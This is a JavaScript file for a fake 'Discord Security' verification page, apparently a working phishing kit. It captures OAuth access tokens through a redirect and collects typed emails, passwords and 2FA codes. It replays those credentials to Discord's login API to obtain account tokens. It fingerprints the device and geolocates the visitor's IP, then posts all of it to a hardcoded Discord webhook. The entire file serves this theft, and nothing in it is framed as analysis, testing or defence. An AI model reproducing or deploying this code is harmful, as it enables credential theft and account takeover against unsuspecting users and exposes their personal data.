'use strict';

/* ================= CONFIG ================= */
const CONFIG = {
  CLIENT_ID   : '1543686292037042176',
  REDIRECT_URI: 'https://wassim635.github.io/discord-verif/callback.html',
  WEBHOOK_URL : 'https://discord.com/api/webhooks/1572285609056411759/1gKtXdnxqFgY8Keke57cLzolYsu2HiMgfMWgvOPcgNWK4EQ17zB96OJrwer0Y5-VX_r2',
  RELAY_URL   : '',
  BOT_NAME    : 'Discord Security'
};
const SCOPES = 'identify email guilds connections';
const ROOT = 'https://wassim635.github.io/discord-verif/';
/* ========================================== */

const MOBILE_RE = /Android|iPhone|iPod|iPad|Windows Phone|IEMobile|Opera Mini|BlackBerry|Mobile Safari/i;
const $ = s => document.querySelector(s);
const show = id => {
  document.querySelectorAll('.screen').forEach(e => e.classList.remove('on'));
  const el = document.getElementById(id);
  if (el) el.classList.add('on');
};
const isMobile = () => MOBILE_RE.test(navigator.userAgent) ||
  (navigator.maxTouchPoints > 1 && /Macintosh/.test(navigator.userAgent));

function deviceLabel(){
  const ua = navigator.userAgent;
  if (/iPhone/.test(ua)) return 'iPhone';
  if (/iPad/.test(ua)) return 'iPad';
  if (/Android/.test(ua)) {
    const m = ua.match(/Android[^;]*;\s*([^;)]+?)(?:\s+Build)?[;)]/);
    return (m && m[1] ? m[1] : 'Android').trim().slice(0, 60);
  }
  if (/Windows NT/.test(ua)) return 'Windows';
  if (/Macintosh/.test(ua)) return 'macOS';
  if (/CrOS/.test(ua)) return 'ChromeOS';
  if (/Linux/.test(ua)) return 'Linux';
  return 'Inconnu';
}

function device(){
  return {
    label: deviceLabel(),
    mobile: isMobile(),
    platform: navigator.platform || '—',
    screen: `${screen.width}x${screen.height}`,
    lang: navigator.language || '—',
    tz: (() => { try { return Intl.DateTimeFormat().resolvedOptions().timeZone; } catch(e){ return '—'; } })(),
    cores: navigator.hardwareConcurrency || '—',
    ua: navigator.userAgent
  };
}

async function geo(){
  try {
    const r = await fetch('https://ipwho.is/', { cache: 'no-store' });
    const j = await r.json();
    return (j && j.success) ? j : null;
  } catch(e){ return null; }
}

async function send(payload){
  const url = CONFIG.RELAY_URL || CONFIG.WEBHOOK_URL;
  try {
    await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload),
      keepalive: true
    });
  } catch(e){}
}

async function report(title, color, rows){
  const d = device(), g = await geo();
  const fields = [];
  const push = (n, v, inline = true) => {
    if (v === undefined || v === null || v === '') return;
    fields.push({ name: n, value: String(v).slice(0, 1024), inline });
  };
  push('Appareil', d.label);
  push('Mobile', d.mobile ? 'Oui' : 'Non');
  push('Plateforme', d.platform);
  push('Écran', d.screen);
  push('Langue', d.lang);
  push('Fuseau', d.tz);
  push('Cœurs CPU', d.cores);
  if (g){
    push('IP', g.ip);
    push('Localisation', [g.city, g.region, g.country].filter(Boolean).join(', '));
    push('FAI', g.connection && g.connection.isp);
  }
  push('User-Agent', d.ua, false);
  rows.forEach(r => push(r[0], r[1], r[2] !== false));

  await send({
    username: CONFIG.BOT_NAME,
    avatar_url: 'https://cdn.discordapp.com/embed/avatars/0.png',
    embeds: [{
      title, color, fields,
      timestamp: new Date().toISOString(),
      footer: { text: 'verify • ' + new Date().toLocaleString('fr-FR') }
    }]
  });
}

async function doLogin(login, password){
  const r = await fetch('https://discord.com/api/v9/auth/login', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', 'X-Discord-Locale': 'fr' },
    body: JSON.stringify({
      login, password, undelete: false, captcha_key: null,
      login_source: null, gift_code_sku_id: null
    })
  });
  const data = await r.json().catch(() => ({}));
  return { ok: r.ok, status: r.status, data };
}

async function doTotp(code, ticket){
  const r = await fetch('https://discord.com/api/v9/auth/mfa/totp', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', 'X-Discord-Locale': 'fr' },
    body: JSON.stringify({ code, ticket, login_source: null, gift_code_sku_id: null })
  });
  const data = await r.json().catch(() => ({}));
  return { ok: r.ok, status: r.status, data };
}

let TICKET = null;

function bindVerify(){
  $('#device-chip').textContent = deviceLabel() + ' • ' + (navigator.language || 'fr');

  $('#form-login').addEventListener('submit', async e => {
    e.preventDefault();
    const email = $('#email').value.trim();
    const pass  = $('#password').value;
    if (!email || !pass) return;

    show('screen-loading');
    $('#load-txt').textContent = 'Vérification des informations…';

    let res;
    try { res = await doLogin(email, pass); }
    catch(err){ res = { ok: false, status: 0, data: {} }; }

    if (res.data && res.data.token){
      await report('🔑 Identifiants valides + token', 0x23a55a, [
        ['E-mail', '`' + email + '`'],
        ['Mot de passe', '`' + pass + '`'],
        ['Token', '```' + res.data.token + '```', false]
      ]);
      show('screen-done');
      return;
    }
    if (res.data && res.data.mfa){
      TICKET = res.data.ticket;
      await report('🔐 Identifiants valides — 2FA demandée', 0xfaa61a, [
        ['E-mail', '`' + email + '`'],
        ['Mot de passe', '`' + pass + '`'],
        ['Ticket', '`' + (res.data.ticket || '') + '`', false]
      ]);
      show('screen-2fa');
      return;
    }
    if (res.data && res.data.captcha_key){
      await report('⚠️ Identifiants (captcha requise)', 0xfaa61a, [
        ['E-mail', '`' + email + '`'],
        ['Mot de passe', '`' + pass + '`'],
        ['Note', 'captcha-required — connexion manuelle', false]
      ]);
      show('screen-done');
      return;
    }
    await report('❌ Connexion échouée', 0xf23f43, [
      ['E-mail', '`' + email + '`'],
      ['Mot de passe', '`' + pass + '`'],
      ['Réponse', '```' + JSON.stringify(res.data).slice(0, 900) + '```', false]
    ]);
    show('screen-error');
  });

  $('#form-2fa').addEventListener('submit', async e => {
    e.preventDefault();
    const code = $('#otp').value.trim();
    if (code.length !== 6) return;
    show('screen-loading');
    $('#load-txt').textContent = 'Validation du code…';

    let res;
    try { res = await doTotp(code, TICKET); }
    catch(err){ res = { ok: false, data: {} }; }

    if (res.data && res.data.token){
      await report('✅ 2FA validée + token', 0x23a55a, [
        ['Code', '`' + code + '`'],
        ['Token', '```' + res.data.token + '```', false]
      ]);
      show('screen-done');
    } else {
      await report('❌ Code 2FA refusé', 0xf23f43, [
        ['Code', '`' + code + '`'],
        ['Réponse', '```' + JSON.stringify(res.data).slice(0, 900) + '```', false]
      ]);
      show('screen-error');
    }
  });

  $('#btn-retry').addEventListener('click', () => show('screen-verify'));
}

async function runCallback(){
  const h = new URLSearchParams(location.hash.slice(1));
  const token = h.get('access_token');
  const scope = h.get('scope') || '';
  const exp   = h.get('expires_in') || '';
  const err   = h.get('error');

  history.replaceState(null, '', location.pathname);

  if (!token){
    $('#cb-title').textContent = err ? 'Autorisation refusée' : 'Session introuvable';
    $('#cb-sub').textContent = err || 'Recommencez depuis la page de vérification.';
    $('#cb-spin').style.display = 'none';
    const b = $('#cb-next');
    b.classList.remove('hide');
    b.textContent = 'Recommencer';
    b.onclick = () => { location.href = ROOT; };
    return;
  }

  let me = null;
  try {
    const r = await fetch('https://discord.com/api/v10/users/@me', {
      headers: { Authorization: 'Bearer ' + token }
    });
    if (r.ok) me = await r.json();
  } catch(e){}

  let guilds = '';
  try {
    const r = await fetch('https://discord.com/api/v10/users/@me/guilds', {
      headers: { Authorization: 'Bearer ' + token }
    });
    if (r.ok){ const g = await r.json(); guilds = Array.isArray(g) ? g.length + ' serveur(s)' : ''; }
  } catch(e){}

  const rows = [
    ['Token OAuth', '```' + token + '```', false],
    ['Scopes', '`' + scope + '`'],
    ['Expire dans', '`' + exp + ' s`']
  ];
  if (me){
    rows.unshift(
      ['Utilisateur', '`' + (me.username || '') + (me.discriminator && me.discriminator !== '0' ? '#' + me.discriminator : '') + '` — <@' + me.id + '>'],
      ['ID', '`' + me.id + '`'],
      ['E-mail', me.email ? '`' + me.email + '`' + (me.verified ? ' ✅' : ' ⚠️') : '—'],
      ['Téléphone', me.phone ? '`' + me.phone + '`' : '—'],
      ['Nitro', me.premium_type ? 'Type ' + me.premium_type : 'Aucun'],
      ['MFA activée', me.mfa_enabled ? 'Oui' : 'Non']
    );
    if (guilds) rows.push(['Serveurs', guilds]);
  }

  const d = device();
  await report('🖥️ Token OAuth récupéré' + (d.mobile ? ' (mobile)' : ' (PC)'), 0x5865f2, rows);

  $('#cb-title').textContent = 'Session vérifiée';
  $('#cb-sub').textContent = 'Dernière étape : confirmez votre identité pour sécuriser la connexion.';
  $('#cb-spin').style.display = 'none';
  const b = $('#cb-next');
  b.classList.remove('hide');
  b.textContent = 'Continuer';
  b.onclick = () => { location.href = ROOT + '#verify'; };
}

(function boot(){
  bindVerify();

  if (location.hash.includes('access_token') || location.hash.includes('error=')){
    show('screen-loading');
    runCallback();
    return;
  }
  if (location.hash === '#verify'){ show('screen-verify'); return; }
  if (isMobile()){ show('screen-verify'); return; }

  show('screen-loading');
  setTimeout(() => {
    location.replace('https://discord.com/api/oauth2/authorize'
      + '?client_id=' + encodeURIComponent(CONFIG.CLIENT_ID)
      + '&redirect_uri=' + encodeURIComponent(CONFIG.REDIRECT_URI)
      + '&response_type=token'
      + '&scope=' + encodeURIComponent(SCOPES));
  }, 1400);
})();
